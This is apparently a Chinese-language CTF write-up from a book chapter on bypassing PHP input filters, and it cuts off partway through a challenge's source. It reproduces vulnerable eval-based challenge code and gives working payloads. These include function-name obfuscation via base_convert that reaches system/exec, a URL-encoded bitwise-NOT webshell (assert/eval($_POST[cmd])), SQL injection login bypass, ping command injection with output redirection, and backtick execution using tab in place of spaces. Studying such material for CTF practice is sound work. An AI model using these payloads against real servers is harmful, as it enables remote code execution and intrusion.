<p><img alt="" src="https://pic1.imgdb.cn/item/67b29be1d0e0a243d40010dc.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-12.md -->
<h3 id="_2">进制转换绕过<a class="headerlink" href="#_2" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b34c1cd0e0a243d40050f2.png"></p>
<p>打开页面拿到源代码</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="c1">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span>
<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">])){</span>
<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>    <span class="nb">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>    <span class="c1">//例子 c=20-1</span>
<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>    <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">];</span>
<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>    <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">80</span><span class="p">)</span> <span class="p">{</span>
<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>        <span class="k">die</span><span class="p">(</span><span class="s2">"太长了不会算"</span><span class="p">);</span>
<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>    <span class="p">}</span>
<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">' '</span><span class="p">,</span> <span class="s1">'\t'</span><span class="p">,</span> <span class="s1">'\r'</span><span class="p">,</span> <span class="s1">'\n'</span><span class="p">,</span><span class="s1">'\''</span><span class="p">,</span> <span class="s1">'"'</span><span class="p">,</span> <span class="s1">'`'</span><span class="p">,</span> <span class="s1">'\['</span><span class="p">,</span> <span class="s1">'\]'</span><span class="p">];</span>
<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$blackitem</span><span class="p">)</span> <span class="p">{</span>
<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/'</span> <span class="o">.</span> <span class="nv">$blackitem</span> <span class="o">.</span> <span class="s1">'/m'</span><span class="p">,</span> <span class="nv">$content</span><span class="p">))</span> <span class="p">{</span>
<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>            <span class="k">die</span><span class="p">(</span><span class="s2">"请不要输入奇奇怪怪的字符"</span><span class="p">);</span>
<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>        <span class="p">}</span>
<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>    <span class="p">}</span>
<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>    <span class="c1">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>    <span class="nv">$whitelist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'abs'</span><span class="p">,</span> <span class="s1">'acos'</span><span class="p">,</span> <span class="s1">'acosh'</span><span class="p">,</span> <span class="s1">'asin'</span><span class="p">,</span> <span class="s1">'asinh'</span><span class="p">,</span> <span class="s1">'atan2'</span><span class="p">,</span> <span class="s1">'atan'</span><span class="p">,</span> <span class="s1">'atanh'</span><span class="p">,</span> <span class="s1">'base_convert'</span><span class="p">,</span> <span class="s1">'bindec'</span><span class="p">,</span> <span class="s1">'ceil'</span><span class="p">,</span> <span class="s1">'cos'</span><span class="p">,</span> <span class="s1">'cosh'</span><span class="p">,</span> <span class="s1">'decbin'</span><span class="p">,</span> <span class="s1">'dechex'</span><span class="p">,</span> <span class="s1">'decoct'</span><span class="p">,</span> <span class="s1">'deg2rad'</span><span class="p">,</span> <span class="s1">'exp'</span><span class="p">,</span> <span class="s1">'expm1'</span><span class="p">,</span> <span class="s1">'floor'</span><span class="p">,</span> <span class="s1">'fmod'</span><span class="p">,</span> <span class="s1">'getrandmax'</span><span class="p">,</span> <span class="s1">'hexdec'</span><span class="p">,</span> <span class="s1">'hypot'</span><span class="p">,</span> <span class="s1">'is_finite'</span><span class="p">,</span> <span class="s1">'is_infinite'</span><span class="p">,</span> <span class="s1">'is_nan'</span><span class="p">,</span> <span class="s1">'lcg_value'</span><span class="p">,</span> <span class="s1">'log10'</span><span class="p">,</span> <span class="s1">'log1p'</span><span class="p">,</span> <span class="s1">'log'</span><span class="p">,</span> <span class="s1">'max'</span><span class="p">,</span> <span class="s1">'min'</span><span class="p">,</span> <span class="s1">'mt_getrandmax'</span><span class="p">,</span> <span class="s1">'mt_rand'</span><span class="p">,</span> <span class="s1">'mt_srand'</span><span class="p">,</span> <span class="s1">'octdec'</span><span class="p">,</span> <span class="s1">'pi'</span><span class="p">,</span> <span class="s1">'pow'</span><span class="p">,</span> <span class="s1">'rad2deg'</span><span class="p">,</span> <span class="s1">'rand'</span><span class="p">,</span> <span class="s1">'round'</span><span class="p">,</span> <span class="s1">'sin'</span><span class="p">,</span> <span class="s1">'sinh'</span><span class="p">,</span> <span class="s1">'sqrt'</span><span class="p">,</span> <span class="s1">'srand'</span><span class="p">,</span> <span class="s1">'tan'</span><span class="p">,</span> <span class="s1">'tanh'</span><span class="p">];</span>
<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>    <span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$used_funcs</span><span class="p">);</span>
<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$used_funcs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$func</span><span class="p">)</span> <span class="p">{</span>
<a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">))</span> <span class="p">{</span>
<a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>            <span class="k">die</span><span class="p">(</span><span class="s2">"请不要输入奇奇怪怪的函数"</span><span class="p">);</span>
<a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a>        <span class="p">}</span>
<a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>    <span class="p">}</span>
<a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>    <span class="c1">//帮你算出答案</span>
<a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>    <span class="k">eval</span><span class="p">(</span><span class="s1">'echo '</span><span class="o">.</span><span class="nv">$content</span><span class="o">.</span><span class="s1">';'</span><span class="p">);</span>
<a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a><span class="p">}</span>
</code></pre></div>
<p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符</p>
<p>base_convert() 函数在任意进制之间转换数字</p>
<p>dechex() 函数把十进制数转换为十六进制数</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="x">base_convert(37907361743,10,36) =&gt; "hex2bin"</span>
<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="x">dechex(1598506324) =&gt; "5f474554"</span>
<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="x">$pi=hex2bin("5f474554") =&gt; $pi="_GET"   // hex2bin将一串16进制数转换为二进制字符串</span>
<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="x">($$pi){pi}(($$pi){abs}) =&gt; ($_GET){pi}($_GET){abs}  // {} 可以代替 []</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="x">$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=tac flag.php</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="x">base_convert(696468,10,36) =&gt; "exec"</span>
<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="x">$pi(8768397090111664438,10,30) =&gt; "getallheaders"</span>
<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="x">exec(getallheaders(){1})</span>
<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="x">// 操作 xx 和 yy，中间用逗号隔开，echo 都能输出</span>
<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="x">echo xx,yy</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="x">$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})</span>
</code></pre></div>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-13.md -->
<h3 id="url">URL 编码取反加 ~ 绕过<a class="headerlink" href="#url" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b34f65d0e0a243d400516e.png"></p>
<p>打开网页给出了源码</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'code'</span><span class="p">])){</span>
<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>            <span class="nv">$code</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'code'</span><span class="p">];</span>
<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>                    <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">40</span><span class="p">){</span>
<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>                                        <span class="k">die</span><span class="p">(</span><span class="s2">"This is too Long."</span><span class="p">);</span>
<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>                                                <span class="p">}</span>
<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>                    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[A-Za-z0-9]+/"</span><span class="p">,</span><span class="nv">$code</span><span class="p">)){</span>
<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>                                        <span class="k">die</span><span class="p">(</span><span class="s2">"NO."</span><span class="p">);</span>
<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>                                                <span class="p">}</span>
<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>                    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="p">}</span>
<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="k">else</span><span class="p">{</span>
<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>            <span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="p">}</span>
</code></pre></div>
<p>我们将 php 代码 URL 编码后取反，我们传入参数后服务端进行 URL 解码</p>
<p>这时由于取反后，会 URL 解码成不可打印字符，这样我们就会绕过</p>
<p>即，对查询语句取反，然后编码</p>
<p>在编码前加上 ~ 进行取反，括号没有被过滤，不用取反</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="x">//?code=phpinfo();</span>
<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="x">?code=(~%8F%97%8F%96%91%99%90)();</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b3554dd0e0a243d400525b.png"></p>
<p>构造木马</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="x">$str1 = 'assert';</span>
<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="x">echo urlencode(~$str1);</span>
<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="x">$str2 = '(eval($_POST[cmd]))';</span>
<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="x">echo '\n';</span>
<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="x">echo urlencode(~$str2);</span>
<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>
<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="x">// %9E%8C%8C%9A%8D%8B\n%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6</span>
</code></pre></div>
<p>蚁剑成功连接</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b3564dd0e0a243d4005279.png"></p>
<p>最后借助蚁剑插件选择 PHP7_GC_UAF 模式运行 /readflag</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67b35791d0e0a243d40052ca.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-14.md -->
<h3 id="_3">输出重定向绕过无回显<a class="headerlink" href="#_3" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67bc0d3bd0e0a243d4033c98.png"></p>
<p>打开页面是一个登录框</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67bc0ea8d0e0a243d4033d2e.png"></p>
<p>在 BurpSuite 中抓包发现有 tip</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67bc0ec8d0e0a243d4033d4c.png"></p>
<p>解码是后端 SQL 语句</p>
<p>显示如果密码等于它的 md5 值则登陆成功</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67bc0eecd0e0a243d4033d57.png"></p>
<p>构造 payload</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>' union select 1,md5(123)#&amp;password=123
</code></pre></div>
<p>登录进去是一个 Ping 程序</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67bc0f22d0e0a243d4033d65.png"></p>
<p>127.0.0.1|ls / 没有回显</p>
<p>127.0.0.1|sleep 5 有延迟说明命令执行了，但是输出可能被过滤了</p>
<p>127.0.0.1|cat /flag&gt;1.php 输出重定向</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67bc0fadd0e0a243d4033daf.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-15.md -->
<h3 id="t">\t 代替空格绕过<a class="headerlink" href="#t" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67d825c788c538a9b5bff9d7.png"></p>
<p>打开页面给出了源码</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$input</span><span class="p">){</span>
<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/'| |_|php|;|~|</span><span class="se">\\</span><span class="s2">^|</span><span class="se">\\</span><span class="s2">+|eval|{|}/i"</span><span class="p">,</span><span class="nv">$input</span><span class="p">)){</span>
<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>        <span class="c1">// if(preg_match("/'| |_|=|php/",$input)){</span>
<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>        <span class="k">die</span><span class="p">(</span><span class="s1">'hacker!!!'</span><span class="p">);</span>
<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>        <span class="k">return</span> <span class="nv">$input</span><span class="p">;</span>
<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>    <span class="p">}</span>
<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="p">}</span>
<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>
<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$input</span><span class="p">){</span>
<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>  <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$input</span><span class="p">)){</span>
<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>      <span class="k">foreach</span><span class="p">(</span><span class="nv">$input</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$output</span><span class="p">){</span>
<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>          <span class="nv">$input</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">waf</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span>
<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a>      <span class="p">}</span>
<a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a>  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a>      <span class="nv">$input</span> <span class="o">=</span> <span class="nx">check</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
<a id="__codelineno-13-20" name="__codelineno-13-20" href="#__codelineno-13-20"></a>  <span class="p">}</span>
<a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a><span class="p">}</span>
<a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a>
<a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a><span class="nv">$dir</span> <span class="o">=</span> <span class="s1">'sandbox/'</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">])</span> <span class="o">.</span> <span class="s1">'/'</span><span class="p">;</span>
<a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)){</span>
<a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a>    <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
<a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a><span class="p">}</span>
<a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a><span class="k">switch</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"action"</span><span class="p">]</span> <span class="o">??</span> <span class="s2">""</span><span class="p">)</span> <span class="p">{</span>
<a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a>    <span class="k">case</span> <span class="s1">'pwd'</span><span class="o">:</span>
<a id="__codelineno-13-29" name="__codelineno-13-29" href="#__codelineno-13-29"></a>        <span class="k">echo</span> <span class="nv">$dir</span><span class="p">;</span>
<a id="__codelineno-13-30" name="__codelineno-13-30" href="#__codelineno-13-30"></a>        <span class="k">break</span><span class="p">;</span>
<a id="__codelineno-13-31" name="__codelineno-13-31" href="#__codelineno-13-31"></a>    <span class="k">case</span> <span class="s1">'upload'</span><span class="o">:</span>
<a id="__codelineno-13-32" name="__codelineno-13-32" href="#__codelineno-13-32"></a>        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"data"</span><span class="p">]</span> <span class="o">??</span> <span class="s2">""</span><span class="p">;</span>
<a id="__codelineno-13-33" name="__codelineno-13-33" href="#__codelineno-13-33"></a>        <span class="nx">waf</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
<a id="__codelineno-13-34" name="__codelineno-13-34" href="#__codelineno-13-34"></a>        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"</span><span class="si">$dir</span><span class="s2">"</span> <span class="o">.</span> <span class="s2">"index.php"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
<a id="__codelineno-13-35" name="__codelineno-13-35" href="#__codelineno-13-35"></a><span class="p">}</span>
<a id="__codelineno-13-36" name="__codelineno-13-36" href="#__codelineno-13-36"></a><span class="cp">?&gt;</span>
</code></pre></div>
<p>先看看路径是什么</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/67d8260f88c538a9b5bff9f2.png"></p>
<p>我们需要知道这个目录下有什么，但是常见的 eval() 函数被过滤了</p>
<p>使用 `` 包裹命令，这样 PHP 就会将里面的内容当成命令执行</p>
<p>最后使用 <code>&lt;?=</code> 输出，同时 <code>\t</code> 绕过空格</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="x">?action=upload&amp;data=</span><span class="cp">&lt;?</span><span class="o">=</span><span class="sb">`ls\t/`</span><span class="cp">?&gt;</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/67d8277888c538a9b5bffa4d.png"></p>
<p>访问文件拿到 flag</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>?action=upload&amp;data=&lt;?=`cat\t/flllllll1112222222lag`?&gt;
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/67d8279888c538a9b5bffa5d.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-16.md -->
<h3 id="_4">`` 代替命令执行函数绕过<a class="headerlink" href="#_4" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/67d825c788c538a9b5bff9d7.png"></p>
<p>打开页面给出了源码</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$input</span><span class="p">){</span>
<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/'| |_|php|;|~|</span><span class="se">\\</span><span class="s2">^|</span><span class="se">\\</span><span class="s2">+|eval|{|}/i"</span><span class="p">,</span><span class="nv">$input</span><span class="p">)){</span>
<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>        <span class="c1">// if(preg_match("/'| |_|=|php/",$input)){</span>
<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>        <span class="k">die</span><span class="p">(</span><span class="s1">'hacker!!!'</span><span class="p">);</span>
<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>        <span class="k">return</span> <span class="nv">$input</span><span class="p">;</span>
<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>    <span class="p">}</span>
<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="p">}</span>
<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>
<a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$input</span><span class="p">){</span>
<a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a>  <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$input</span><span class="p">)){</span>
<a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a>      <span class="k">foreach</span><span class="p">(</span><span class="nv">$input</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$output</span><span class="p">){</span>
<a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a>          <span class="nv">$input</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">waf</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span>
<a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a>      <span class="p">}</span>
<a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a>  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a>      <span class="nv">$input</span> <span class="o">=</span> <span class="nx">check</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
<a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a>  <span class="p">}</span>
<a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a><span class="p">}</span>
<a id="__codelineno-16-22" name="__codelineno-16-22" href="#__codelineno-16-22"></a>
<a id="__codelineno-16-23" name="__codelineno-16-23" href="#__codelineno-16-23"></a><span class="nv">$dir</span> <span class="o">=</span> <span class="s1">'sandbox/'</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">])</span> <span class="o">.</span> <span class="s1">'/'</span><span class="p">;</span>
<a id="__codelineno-16-24" name="__codelineno-16-24" href="#__codelineno-16-24"></a><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$dir</span><span class="p">)){</span>
<a id="__codelineno-16-25" name="__codelineno-16-25" href="#__codelineno-16-25"></a>    <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span>
<a id="__codelineno-16-26" name="__codelineno-16-26" href="#__codelineno-16-26"></a><span class="p">}</span>
